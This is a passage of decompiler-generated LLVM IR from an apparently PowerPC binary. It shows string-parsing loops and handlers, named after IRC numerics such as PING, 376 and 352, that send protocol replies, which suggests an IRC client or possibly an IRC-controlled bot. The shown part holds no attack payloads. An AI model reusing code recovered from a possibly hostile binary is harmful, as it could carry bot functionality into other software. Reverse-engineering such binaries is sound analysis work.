  %v3_100015ac = inttoptr i32 %v2_100015a4 to i8*
  store i8 0, i8* %v3_100015ac, align 1
  %v3_100015b8 = load i32, i32* @global_var_1001d844.289, align 4
  store i32 %v1_10001540, i32* %r3.global-to-local, align 4
  store i32 268441032, i32* @lr, align 4
  %v4_100015c4 = call i32 @strwildmatch(i8* %v5_10001544, i32 %v3_100015b8, i32 268566528)
  store i32 %v4_100015c4, i32* %r3.global-to-local, align 4
  %v3_100015cc = icmp eq i32 %v4_100015c4, 0
  br i1 %v3_100015cc, label %dec_label_pc_100015d4, label %dec_label_pc_10001940

dec_label_pc_100015d4:                            ; preds = %dec_label_pc_10001598
  %v1_100015e0 = add i32 %v2_100015a4, 1
  store i32 %v1_100015e0, i32* @r3, align 4
  %v0_100015ec = call i32 @__GI_strlen()
  store i32 %v0_100015ec, i32* %r3.global-to-local, align 4
  store i32 %v0_100015ec, i32* %stack_var_-1144, align 4
  %stack_var_-1136.040 = inttoptr i32 %v1_100015e0 to i8*
  %v2_1000166842 = icmp sgt i32 %v0_100015ec, 0
  br i1 %v2_1000166842, label %dec_label_pc_10001604.lr.ph, label %dec_label_pc_100016b4.preheader

dec_label_pc_10001604.lr.ph:                      ; preds = %dec_label_pc_100015d4
  %v2_1000163c = ptrtoint i32* %stack_var_-1144 to i32
  %v2_10001640 = add i32 %v2_1000163c, 68
  br label %dec_label_pc_10001604

dec_label_pc_10001604:                            ; preds = %dec_label_pc_10001604.lr.ph, %dec_label_pc_1000162c
  %stack_var_-1136.047 = phi i8* [ %stack_var_-1136.040, %dec_label_pc_10001604.lr.ph ], [ %stack_var_-1136.0, %dec_label_pc_1000162c ]
  %storemerge1146 = phi i32 [ 0, %dec_label_pc_10001604.lr.ph ], [ %v1_10001658, %dec_label_pc_1000162c ]
  %stack_var_-1136.0.in45 = phi i32 [ %v1_100015e0, %dec_label_pc_10001604.lr.ph ], [ %v1_1000164c, %dec_label_pc_1000162c ]
  %v2_10001608 = load i8, i8* %stack_var_-1136.047, align 1
  %v3_10001610 = icmp eq i8 %v2_10001608, 32
  br i1 %v3_10001610, label %dec_label_pc_100016b4.preheader, label %dec_label_pc_10001618

dec_label_pc_10001618:                            ; preds = %dec_label_pc_10001604
  %v2_1000161c = load i8, i8* %stack_var_-1136.047, align 1
  %v3_10001624 = icmp eq i8 %v2_1000161c, 0
  br i1 %v3_10001624, label %dec_label_pc_100016b4.preheader, label %dec_label_pc_1000162c

dec_label_pc_1000162c:                            ; preds = %dec_label_pc_10001618
  %v2_10001634 = load i8, i8* %stack_var_-1136.047, align 1
  %v3_10001644 = add i32 %v2_10001640, %storemerge1146
  %v4_10001644 = inttoptr i32 %v3_10001644 to i8*
  store i8 %v2_10001634, i8* %v4_10001644, align 1
  %v1_1000164c = add i32 %stack_var_-1136.0.in45, 1
  %v1_10001658 = add i32 %storemerge1146, 1
  %stack_var_-1136.0 = inttoptr i32 %v1_1000164c to i8*
  %v3_10001664 = load i32, i32* %stack_var_-1144, align 4
  %v2_10001668 = icmp slt i32 %v1_10001658, %v3_10001664
  br i1 %v2_10001668, label %dec_label_pc_10001604, label %dec_label_pc_100016b4.preheader

dec_label_pc_100016b4.preheader:                  ; preds = %dec_label_pc_1000162c, %dec_label_pc_10001604, %dec_label_pc_10001618, %dec_label_pc_100015d4
  %stack_var_-1136.0.in.lcssa = phi i32 [ %v1_100015e0, %dec_label_pc_100015d4 ], [ %v1_1000164c, %dec_label_pc_1000162c ], [ %stack_var_-1136.0.in45, %dec_label_pc_10001604 ], [ %stack_var_-1136.0.in45, %dec_label_pc_10001618 ]
  %stack_var_-1136.0.lcssa = phi i8* [ %stack_var_-1136.040, %dec_label_pc_100015d4 ], [ %stack_var_-1136.0, %dec_label_pc_1000162c ], [ %stack_var_-1136.047, %dec_label_pc_10001604 ], [ %stack_var_-1136.047, %dec_label_pc_10001618 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %stack_var_-1136.0.in.lcssa, i32* @r3, align 4
  %v0_100016bc32 = call i32 @__GI_strlen()
  store i32 %v0_100016bc32, i32* %r3.global-to-local, align 4
  %v0_100016c433 = load i32, i32* %r29.global-to-local, align 4
  %v2_100016c434 = icmp ult i32 %v0_100016c433, %v0_100016bc32
  br i1 %v2_100016c434, label %dec_label_pc_1000167c, label %dec_label_pc_100016cc

dec_label_pc_1000167c:                            ; preds = %dec_label_pc_100016b4.preheader, %dec_label_pc_100016a8
  %storemerge1238 = phi i32 [ %v1_100016ac, %dec_label_pc_100016a8 ], [ 0, %dec_label_pc_100016b4.preheader ]
  %stack_var_-1140.137 = phi i32 [ %stack_var_-1140.0, %dec_label_pc_100016a8 ], [ 0, %dec_label_pc_100016b4.preheader ]
  %v2_10001688 = add i32 %storemerge1238, %stack_var_-1136.0.in.lcssa
  %v1_1000168c = inttoptr i32 %v2_10001688 to i8*
  %v2_1000168c = load i8, i8* %v1_1000168c, align 1
  %v3_10001694 = icmp eq i8 %v2_1000168c, 32
  br i1 %v3_10001694, label %dec_label_pc_1000169c, label %dec_label_pc_100016a8

dec_label_pc_1000169c:                            ; preds = %dec_label_pc_1000167c
  %v1_100016a0 = add i32 %stack_var_-1140.137, 1
  br label %dec_label_pc_100016a8

dec_label_pc_100016a8:                            ; preds = %dec_label_pc_1000167c, %dec_label_pc_1000169c
  %stack_var_-1140.0 = phi i32 [ %v1_100016a0, %dec_label_pc_1000169c ], [ %stack_var_-1140.137, %dec_label_pc_1000167c ]
  %v1_100016ac = add i32 %storemerge1238, 1
  store i32 %v1_100016ac, i32* %r29.global-to-local, align 4
  store i32 %stack_var_-1136.0.in.lcssa, i32* @r3, align 4
  %v0_100016bc = call i32 @__GI_strlen()
  store i32 %v0_100016bc, i32* %r3.global-to-local, align 4
  %v0_100016c4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100016c4 = icmp ult i32 %v0_100016c4, %v0_100016bc
  br i1 %v2_100016c4, label %dec_label_pc_1000167c, label %dec_label_pc_100016cc

dec_label_pc_100016cc:                            ; preds = %dec_label_pc_100016a8, %dec_label_pc_100016b4.preheader
  %stack_var_-1140.1.lcssa = phi i32 [ 0, %dec_label_pc_100016b4.preheader ], [ %stack_var_-1140.0, %dec_label_pc_100016a8 ]
  %v1_100016d0 = add i32 %stack_var_-1140.1.lcssa, 1
  %tmp102 = icmp slt i32 %v1_100016d0, 11
  br i1 %tmp102, label %dec_label_pc_100016ec, label %dec_label_pc_100016e4

dec_label_pc_100016e4:                            ; preds = %dec_label_pc_100016cc
  br label %dec_label_pc_100016ec

dec_label_pc_100016ec:                            ; preds = %dec_label_pc_100016cc, %dec_label_pc_100016e4
  %stack_var_-1140.2 = phi i32 [ %v1_100016d0, %dec_label_pc_100016cc ], [ 10, %dec_label_pc_100016e4 ]
  %v1_100016f8 = mul i32 %stack_var_-1140.2, 4
  %v2_10001700 = ptrtoint i32* %stack_var_-1144 to i32
  %v2_10001704 = add i32 %v2_10001700, 24
  %v1_10001708 = add i32 %v2_10001704, %v1_100016f8
  %v2_10001714 = inttoptr i32 %v1_10001708 to i32*
  store i32 ptrtoint (i32* @global_var_1000b8b4.290 to i32), i32* %v2_10001714, align 4
  store i32 1, i32* %stack_var_-1144, align 4
  %v2_1000183827 = load i8, i8* %stack_var_-1136.0.lcssa, align 1
  %v3_1000184030 = icmp eq i8 %v2_1000183827, 0
  br i1 %v3_1000184030, label %dec_label_pc_10001848, label %dec_label_pc_10001724.lr.ph

dec_label_pc_10001724.lr.ph:                      ; preds = %dec_label_pc_100016ec
  %v4_1000183426 = ptrtoint i8* %stack_var_-1136.0.lcssa to i32
  %v2_100017b4 = add i32 %v2_10001700, 20
  br label %dec_label_pc_10001724

dec_label_pc_10001724:                            ; preds = %dec_label_pc_10001724.lr.ph, %dec_label_pc_10001790
  %v3_10001730 = phi i32 [ 1, %dec_label_pc_10001724.lr.ph ], [ %v1_10001818, %dec_label_pc_10001790 ]
  %v4_1000183431 = phi i32 [ %v4_1000183426, %dec_label_pc_10001724.lr.ph ], [ %v2_1000182c, %dec_label_pc_10001790 ]
  %v1_10001728 = add i32 %v4_1000183431, 1
  %v2_10001738 = icmp slt i32 %v3_10001730, %stack_var_-1140.2
  br i1 %v2_10001738, label %dec_label_pc_10001758.preheader, label %dec_label_pc_10001848

dec_label_pc_10001758.preheader:                  ; preds = %dec_label_pc_10001724
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10001728, i32* @r3, align 4
  %v0_1000176019 = call i32 @__GI_strlen()
  store i32 %v0_1000176019, i32* %r3.global-to-local, align 4
  %v0_1000176820 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000176821 = icmp ult i32 %v0_1000176820, %v0_1000176019
  br i1 %v2_1000176821, label %dec_label_pc_10001770, label %dec_label_pc_10001790

dec_label_pc_1000174c:                            ; preds = %dec_label_pc_10001770
  %v1_10001750 = add i32 %storemerge1424, 1
  store i32 %v1_10001750, i32* %r29.global-to-local, align 4
  store i32 %v1_10001728, i32* @r3, align 4
  %v0_10001760 = call i32 @__GI_strlen()
  store i32 %v0_10001760, i32* %r3.global-to-local, align 4
  %v0_10001768 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001768 = icmp ult i32 %v0_10001768, %v0_10001760
  br i1 %v2_10001768, label %dec_label_pc_10001770, label %dec_label_pc_10001790

dec_label_pc_10001770:                            ; preds = %dec_label_pc_10001758.preheader, %dec_label_pc_1000174c
  %storemerge1424 = phi i32 [ %v1_10001750, %dec_label_pc_1000174c ], [ 0, %dec_label_pc_10001758.preheader ]
  %v2_1000177c = add i32 %storemerge1424, %v1_10001728
  %v1_10001780 = inttoptr i32 %v2_1000177c to i8*
  %v2_10001780 = load i8, i8* %v1_10001780, align 1
  %v3_10001788 = icmp eq i8 %v2_10001780, 32
  br i1 %v3_10001788, label %dec_label_pc_10001790, label %dec_label_pc_1000174c

dec_label_pc_10001790:                            ; preds = %dec_label_pc_1000174c, %dec_label_pc_10001770, %dec_label_pc_10001758.preheader
  %storemerge14.lcssa = phi i32 [ 0, %dec_label_pc_10001758.preheader ], [ %v1_10001750, %dec_label_pc_1000174c ], [ %storemerge1424, %dec_label_pc_10001770 ]
  %v3_10001790 = load i32, i32* %stack_var_-1144, align 4
  store i32 %v3_10001790, i32* @r29, align 4
  %v1_10001798 = add i32 %storemerge14.lcssa, 1
  store i32 %v1_10001798, i32* @r3, align 4
  store i32 268441508, i32* @lr, align 4
  %v0_100017a0 = call i32 @malloc()
  store i32 %v0_100017a0, i32* %r3.global-to-local, align 4
  %v0_100017ac = load i32, i32* @r29, align 4
  %v1_100017ac = mul i32 %v0_100017ac, 4
  %v1_100017b8 = add i32 %v1_100017ac, %v2_100017b4
  %v2_100017bc = inttoptr i32 %v1_100017b8 to i32*
  store i32 %v0_100017a0, i32* %v2_100017bc, align 4
  %v3_100017c0 = load i32, i32* %stack_var_-1144, align 4
  %v1_100017c4 = mul i32 %v3_100017c0, 4
  %v1_100017d0 = add i32 %v1_100017c4, %v2_100017b4
  %v1_100017d4 = inttoptr i32 %v1_100017d0 to i32*
  %v2_100017d4 = load i32, i32* %v1_100017d4, align 4
  store i32 %v2_100017d4, i32* %r3.global-to-local, align 4
  store i32 %v1_10001728, i32* @r4, align 4
  store i32 268441580, i32* @lr, align 4
  %v3_100017e8 = call i32 @strncpy(i32 %v2_100017d4, i32 %v1_10001728, i32 %storemerge14.lcssa)
  store i32 %v3_100017e8, i32* %r3.global-to-local, align 4
  %v3_100017ec = load i32, i32* %stack_var_-1144, align 4
  %v1_100017f0 = mul i32 %v3_100017ec, 4
  %v1_100017fc = add i32 %v1_100017f0, %v2_100017b4
  %v1_10001800 = inttoptr i32 %v1_100017fc to i32*
  %v2_10001800 = load i32, i32* %v1_10001800, align 4
  %v2_10001808 = add i32 %v2_10001800, %storemerge14.lcssa
  %v3_10001810 = inttoptr i32 %v2_10001808 to i8*
  store i8 0, i8* %v3_10001810, align 1
  %v3_10001814 = load i32, i32* %stack_var_-1144, align 4
  %v1_10001818 = add i32 %v3_10001814, 1
  store i32 %v1_10001818, i32* %stack_var_-1144, align 4
  %v2_1000182c = add i32 %storemerge14.lcssa, %v1_10001728
  %v5_10001830 = inttoptr i32 %v2_1000182c to i8*
  %v2_10001838 = load i8, i8* %v5_10001830, align 1
  %v3_10001840 = icmp eq i8 %v2_10001838, 0
  br i1 %v3_10001840, label %dec_label_pc_10001848, label %dec_label_pc_10001724

dec_label_pc_10001848:                            ; preds = %dec_label_pc_10001790, %dec_label_pc_10001724, %dec_label_pc_100016ec
  store i32 0, i32* %stack_var_-1144, align 4
  %v2_10001934 = load i32, i32* bitcast ([4 x i8]** @global_var_1001d44c.291 to i32*), align 4
  %v3_10001938 = icmp eq i32 %v2_10001934, 0
  br i1 %v3_10001938, label %dec_label_pc_10001940, label %dec_label_pc_10001854

dec_label_pc_10001854:                            ; preds = %dec_label_pc_10001848
  store i32 %v2_10001934, i32* @r3, align 4
  store i32 %v2_1000151c, i32* @r4, align 4
  %v2_10001878 = call i32 @__GI_strcasecmp(i32 %v2_10001934, i32 %v2_1000151c)
  store i32 %v2_10001878, i32* %r3.global-to-local, align 4
  %v3_10001888 = load i32, i32* %stack_var_-1144, align 4
  %v1_10001894 = mul i32 %v3_10001888, 8
  %v1_1000189c = add i32 %v1_10001894, add (i32 ptrtoint ([4 x i8]** @global_var_1001d44c.291 to i32), i32 4)
  %v1_100018a0 = inttoptr i32 %v1_1000189c to i32*
  %v2_100018a0 = load i32, i32* %v1_100018a0, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_100018a0)
  %v2_1000190815 = icmp sgt i32 %stack_var_-1140.2, 1
  br i1 %v2_1000190815, label %dec_label_pc_100018d4.lr.ph, label %dec_label_pc_10001940

dec_label_pc_100018d4.lr.ph:                      ; preds = %dec_label_pc_10001854
  %v2_100018e0 = add i32 %v2_10001700, 20
  br label %dec_label_pc_100018d4

dec_label_pc_100018d4:                            ; preds = %dec_label_pc_100018d4.lr.ph, %dec_label_pc_100018d4
  %storemerge1318 = phi i32 [ 1, %dec_label_pc_100018d4.lr.ph ], [ %v1_100018f8, %dec_label_pc_100018d4 ]
  %v1_100018d8 = mul i32 %storemerge1318, 4
  %v1_100018e4 = add i32 %v2_100018e0, %v1_100018d8
  %v1_100018e8 = inttoptr i32 %v1_100018e4 to i32*
  %v2_100018e8 = load i32, i32* %v1_100018e8, align 4
  store i32 %v2_100018e8, i32* @r3, align 4
  store i32 268441844, i32* @lr, align 4
  %v0_100018f0 = call i32 @free()
  store i32 %v0_100018f0, i32* %r3.global-to-local, align 4
  %v1_100018f8 = add nuw nsw i32 %storemerge1318, 1
  %v2_10001908 = icmp slt i32 %v1_100018f8, %stack_var_-1140.2
  br i1 %v2_10001908, label %dec_label_pc_100018d4, label %dec_label_pc_10001940

dec_label_pc_10001940:                            ; preds = %dec_label_pc_100018d4, %dec_label_pc_10001854, %dec_label_pc_10001848, %dec_label_pc_10001598, %dec_label_pc_100014fc, %dec_label_pc_100014d0
  %v2_10001940 = load i32, i32* %stack_var_-1152, align 4
  %v1_1000194c = add i32 %v2_10001940, -12
  %v2_1000194c = inttoptr i32 %v1_1000194c to i32*
  %v3_1000194c = load i32, i32* %v2_1000194c, align 4
  store i32 %v3_1000194c, i32* %r29.global-to-local, align 4
  %v0_10001958 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10001958

; uselistorder directives
  uselistorder i32 %storemerge1318, { 1, 0 }
  uselistorder i32 %v2_10001934, { 1, 0, 2 }
  uselistorder i32 %v2_1000182c, { 1, 0 }
  uselistorder i32 %v1_10001818, { 1, 0 }
  uselistorder i32 %storemerge14.lcssa, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10001728, { 0, 3, 4, 1, 5, 2 }
  uselistorder i32 %v2_10001700, { 2, 1, 0 }
  uselistorder i32 %stack_var_-1140.2, { 3, 1, 2, 0 }
  uselistorder i32 %v1_100016ac, { 1, 0 }
  uselistorder i32 %stack_var_-1140.137, { 1, 0 }
  uselistorder i32 %storemerge1238, { 1, 0 }
  uselistorder i8* %stack_var_-1136.0.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-1136.0.in.lcssa, { 2, 0, 1 }
  uselistorder i32 %storemerge1146, { 1, 0 }
  uselistorder i32 %v1_10001540, { 3, 0, 1, 4, 2, 5 }
  uselistorder i32 %v2_1000151c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10001454, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1144, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 11, 9 }
  uselistorder i32* %r3.global-to-local, { 20, 1, 2, 3, 4, 5, 6, 7, 18, 8, 19, 9, 10, 11, 12, 17, 13, 14, 15, 21, 16, 22, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 13, 14, 3, 4, 15, 16, 5, 6, 11, 12, 7, 8, 17, 18, 9, 10, 19, 20 }
  uselistorder i32 %arg3, { 4, 3, 0, 1, 5, 2 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_100018d4, { 1, 0 }
  uselistorder label %dec_label_pc_10001790, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001770, { 1, 0 }
  uselistorder label %dec_label_pc_10001724, { 1, 0 }
  uselistorder label %dec_label_pc_100016ec, { 1, 0 }
  uselistorder label %dec_label_pc_100016a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000167c, { 1, 0 }
  uselistorder label %dec_label_pc_100016b4.preheader, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10001604, { 1, 0 }
  uselistorder label %dec_label_pc_10001598, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001578, { 1, 0 }
  uselistorder label %dec_label_pc_100014d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100014b0, { 1, 0 }
  uselistorder label %dec_label_pc_10001448, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001428, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_10001980 = load i32, i32* @global_var_1001d844.289, align 4
  %v5_10001998 = load i32, i32* @r7, align 4
  %v6_10001998 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1000b8b8.293 to i32), i32 %v3_10001980, i32 268500992, i32 %v5_10001998)
  %v3_100019a0 = load i32, i32* @global_var_1001d85c.277, align 4
  %v3_100019a8 = load i32, i32* @global_var_1001d858.294, align 4
  %v6_100019c4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1000b8c8.295 to i32), i32 %v3_100019a0, i32 %v3_100019a8, i32 268500992)
  %v3_100019cc = load i32, i32* @global_var_1001d844.289, align 4
  %v5_100019e4 = load i32, i32* @r7, align 4
  %v6_100019e4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1000b8d8.296 to i32), i32 %v3_100019cc, i32 268500992, i32 %v5_100019e4)
  ret i32 %v6_100019e4
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v5_10001a34 = load i32, i32* @r7, align 4
  %v6_10001a34 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1000b8e0.297 to i32), i32 %arg3, i32 268500992, i32 %v5_10001a34)
  ret i32 %v6_10001a34
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-80 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001a50 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001a50, i32* %stack_var_-80, align 4
  br label %dec_label_pc_10001aa8.preheader

dec_label_pc_10001a90:                            ; preds = %dec_label_pc_10001ac0
  %v4_10001ac0 = ptrtoint i8* %stack_var_-68.058 to i32
  %v1_10001a94 = add i32 %v4_10001ac0, 1
  %v5_10001a98 = inttoptr i32 %v1_10001a94 to i8*
  %v1_10001aa0 = add i32 %stack_var_-60.057, 1
  store i32 %v1_10001aa0, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001ab0 = call i32 @__GI_strlen()
  %v0_10001ab8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001ab8 = icmp ult i32 %v0_10001ab8, %v0_10001ab0
  br i1 %v2_10001ab8, label %dec_label_pc_10001ac0, label %dec_label_pc_10001ad4

dec_label_pc_10001ac0:                            ; preds = %dec_label_pc_10001aa8.preheader, %dec_label_pc_10001a90
  %stack_var_-68.058 = phi i8* [ %v5_10001a98, %dec_label_pc_10001a90 ], [ %stack_var_-68.164, %dec_label_pc_10001aa8.preheader ]
  %stack_var_-60.057 = phi i32 [ %v1_10001aa0, %dec_label_pc_10001a90 ], [ %stack_var_-60.163, %dec_label_pc_10001aa8.preheader ]
  %v2_10001ac4 = load i8, i8* %stack_var_-68.058, align 1
  %v3_10001acc = icmp eq i8 %v2_10001ac4, 32
  br i1 %v3_10001acc, label %dec_label_pc_10001ad4, label %dec_label_pc_10001a90

dec_label_pc_10001ad4:                            ; preds = %dec_label_pc_10001a90, %dec_label_pc_10001ac0, %dec_label_pc_10001aa8.preheader
  %stack_var_-60.0.lcssa = phi i32 [ %stack_var_-60.163, %dec_label_pc_10001aa8.preheader ], [ %v1_10001aa0, %dec_label_pc_10001a90 ], [ %stack_var_-60.057, %dec_label_pc_10001ac0 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.164, %dec_label_pc_10001aa8.preheader ], [ %v5_10001a98, %dec_label_pc_10001a90 ], [ %stack_var_-68.058, %dec_label_pc_10001ac0 ]
  %v4_10001ad4 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_10001ad8 = add i32 %v4_10001ad4, 1
  store i32 %stack_var_-60.0.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001ae8 = call i32 @__GI_strlen()
  %v0_10001af0 = load i32, i32* %r29.global-to-local, align 4
  %v4_10001af0 = icmp eq i32 %v0_10001af0, %v0_10001ae8
  br i1 %v4_10001af0, label %dec_label_pc_10001d8c, label %dec_label_pc_10001af8

dec_label_pc_10001af8:                            ; preds = %dec_label_pc_10001ad4
  %v5_10001adc = inttoptr i32 %v1_10001ad8 to i8*
  %v1_10001afc = add nuw nsw i32 %storemerge965, 1
  %tmp92 = icmp slt i32 %v1_10001afc, 5
  br i1 %tmp92, label %dec_label_pc_10001aa8.preheader, label %dec_label_pc_10001b28.preheader

dec_label_pc_10001aa8.preheader:                  ; preds = %entry, %dec_label_pc_10001af8
  %storemerge965 = phi i32 [ 0, %entry ], [ %v1_10001afc, %dec_label_pc_10001af8 ]
  %stack_var_-68.164 = phi i8* [ %arg3, %entry ], [ %v5_10001adc, %dec_label_pc_10001af8 ]
  %stack_var_-60.163 = phi i32 [ 0, %entry ], [ %stack_var_-60.0.lcssa, %dec_label_pc_10001af8 ]
  store i32 %stack_var_-60.163, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001ab052 = call i32 @__GI_strlen()
  %v0_10001ab853 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001ab854 = icmp ult i32 %v0_10001ab853, %v0_10001ab052
  br i1 %v2_10001ab854, label %dec_label_pc_10001ac0, label %dec_label_pc_10001ad4

dec_label_pc_10001b28.preheader:                  ; preds = %dec_label_pc_10001af8
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10001ad8, i32* @r3, align 4
  %v0_10001b3042 = call i32 @__GI_strlen()
  %v0_10001b3843 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001b3844 = icmp ult i32 %v0_10001b3843, %v0_10001b3042
  br i1 %v2_10001b3844, label %dec_label_pc_10001b40, label %dec_label_pc_10001b60

dec_label_pc_10001b1c:                            ; preds = %dec_label_pc_10001b40
  %v1_10001b20 = add i32 %storemerge1047, 1
  store i32 %v1_10001b20, i32* %r29.global-to-local, align 4
  store i32 %v1_10001ad8, i32* @r3, align 4
  %v0_10001b30 = call i32 @__GI_strlen()
  %v0_10001b38 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001b38 = icmp ult i32 %v0_10001b38, %v0_10001b30
  br i1 %v2_10001b38, label %dec_label_pc_10001b40, label %dec_label_pc_10001b60

dec_label_pc_10001b40:                            ; preds = %dec_label_pc_10001b28.preheader, %dec_label_pc_10001b1c
  %storemerge1047 = phi i32 [ %v1_10001b20, %dec_label_pc_10001b1c ], [ 0, %dec_label_pc_10001b28.preheader ]
  %v2_10001b4c = add i32 %storemerge1047, %v1_10001ad8
  %v1_10001b50 = inttoptr i32 %v2_10001b4c to i8*
  %v2_10001b50 = load i8, i8* %v1_10001b50, align 1
  %v3_10001b58 = icmp eq i8 %v2_10001b50, 32
  br i1 %v3_10001b58, label %dec_label_pc_10001b60, label %dec_label_pc_10001b1c

dec_label_pc_10001b60:                            ; preds = %dec_label_pc_10001b1c, %dec_label_pc_10001b40, %dec_label_pc_10001b28.preheader
  %storemerge10.lcssa = phi i32 [ 0, %dec_label_pc_10001b28.preheader ], [ %v1_10001b20, %dec_label_pc_10001b1c ], [ %storemerge1047, %dec_label_pc_10001b40 ]
  %v2_10001b6c = add i32 %storemerge10.lcssa, %v1_10001ad8
  %v3_10001b74 = inttoptr i32 %v2_10001b6c to i8*
  store i8 0, i8* %v3_10001b74, align 1
  %v3_10001b7c = load i32, i32* @global_var_1001d844.289, align 4
  store i32 %v1_10001ad8, i32* @r3, align 4
  store i32 %v3_10001b7c, i32* @r4, align 4
  %v3_10001b88 = call i32 @__GI_strcasecmp(i32 %v1_10001ad8, i32 %v3_10001b7c)
  %v3_10001b90 = icmp eq i32 %v3_10001b88, 0
  br i1 %v3_10001b90, label %dec_label_pc_10001b98, label %dec_label_pc_10001d8c

dec_label_pc_10001b98:                            ; preds = %dec_label_pc_10001b60
  %v3_10001b9c = load i32, i32* @global_var_1001d830.298, align 4
  %v3_10001ba0 = icmp eq i32 %v3_10001b9c, 0
  br i1 %v3_10001ba0, label %dec_label_pc_10001ba8, label %dec_label_pc_10001d8c

dec_label_pc_10001ba8:                            ; preds = %dec_label_pc_10001b98
  br label %dec_label_pc_10001bdc.preheader

dec_label_pc_10001bc4:                            ; preds = %dec_label_pc_10001bf4
  %v4_10001bf4 = ptrtoint i8* %stack_var_-68.234 to i32
  %v1_10001bc8 = add i32 %v4_10001bf4, 1
  %v5_10001bcc = inttoptr i32 %v1_10001bc8 to i8*
  %v1_10001bd4 = add i32 %stack_var_-60.233, 1
  store i32 %v1_10001bd4, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001be4 = call i32 @__GI_strlen()
  %v0_10001bec = load i32, i32* %r29.global-to-local, align 4
  %v2_10001bec = icmp ult i32 %v0_10001bec, %v0_10001be4
  br i1 %v2_10001bec, label %dec_label_pc_10001bf4, label %dec_label_pc_10001c08

dec_label_pc_10001bf4:                            ; preds = %dec_label_pc_10001bdc.preheader, %dec_label_pc_10001bc4
  %stack_var_-68.234 = phi i8* [ %v5_10001bcc, %dec_label_pc_10001bc4 ], [ %stack_var_-68.340, %dec_label_pc_10001bdc.preheader ]
  %stack_var_-60.233 = phi i32 [ %v1_10001bd4, %dec_label_pc_10001bc4 ], [ %stack_var_-60.339, %dec_label_pc_10001bdc.preheader ]
  %v2_10001bf8 = load i8, i8* %stack_var_-68.234, align 1
  %v3_10001c00 = icmp eq i8 %v2_10001bf8, 32
  br i1 %v3_10001c00, label %dec_label_pc_10001c08, label %dec_label_pc_10001bc4

dec_label_pc_10001c08:                            ; preds = %dec_label_pc_10001bc4, %dec_label_pc_10001bf4, %dec_label_pc_10001bdc.preheader
  %stack_var_-60.2.lcssa = phi i32 [ %stack_var_-60.339, %dec_label_pc_10001bdc.preheader ], [ %v1_10001bd4, %dec_label_pc_10001bc4 ], [ %stack_var_-60.233, %dec_label_pc_10001bf4 ]
  %stack_var_-68.2.lcssa = phi i8* [ %stack_var_-68.340, %dec_label_pc_10001bdc.preheader ], [ %v5_10001bcc, %dec_label_pc_10001bc4 ], [ %stack_var_-68.234, %dec_label_pc_10001bf4 ]
  %v4_10001c08 = ptrtoint i8* %stack_var_-68.2.lcssa to i32
  %v1_10001c0c = add i32 %v4_10001c08, 1
  store i32 %stack_var_-60.2.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001c1c = call i32 @__GI_strlen()
  %v0_10001c24 = load i32, i32* %r29.global-to-local, align 4
  %v4_10001c24 = icmp eq i32 %v0_10001c24, %v0_10001c1c
  br i1 %v4_10001c24, label %dec_label_pc_10001d8c, label %dec_label_pc_10001c2c

dec_label_pc_10001c2c:                            ; preds = %dec_label_pc_10001c08
  %v5_10001c10 = inttoptr i32 %v1_10001c0c to i8*
  %v1_10001c30 = add nuw nsw i32 %storemerge1141, 1
  %tmp93 = icmp slt i32 %v1_10001c30, 3
  br i1 %tmp93, label %dec_label_pc_10001bdc.preheader, label %dec_label_pc_10001c5c.preheader

dec_label_pc_10001bdc.preheader:                  ; preds = %dec_label_pc_10001ba8, %dec_label_pc_10001c2c
  %storemerge1141 = phi i32 [ 0, %dec_label_pc_10001ba8 ], [ %v1_10001c30, %dec_label_pc_10001c2c ]
  %stack_var_-68.340 = phi i8* [ %arg3, %dec_label_pc_10001ba8 ], [ %v5_10001c10, %dec_label_pc_10001c2c ]
